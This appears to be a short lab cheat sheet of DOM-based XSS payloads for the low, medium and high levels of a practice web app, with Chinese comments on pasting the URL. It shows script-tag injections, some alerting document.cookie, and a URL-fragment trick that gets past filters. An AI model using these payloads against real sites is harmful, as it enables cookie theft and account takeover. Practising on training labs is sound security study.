# XSS Dom
## Level Low Security
```javascript
default=English<script>alert("XSS")</script>
default=English<script>alert(document.cookie)</script>
```

## Level Medium Security
```javascript
//编写完成后复制并且粘贴到一个新的窗口打开链接。字符会自动转换为url编码
default=English#<script>alert("XSS")</script> 
```

## Level Hight Security
```javascript
//编写完成后复制并且粘贴到一个新的窗口打开链接。字符会自动转换为url编码
default=English#<script>alert(document.cookie)</script>
```
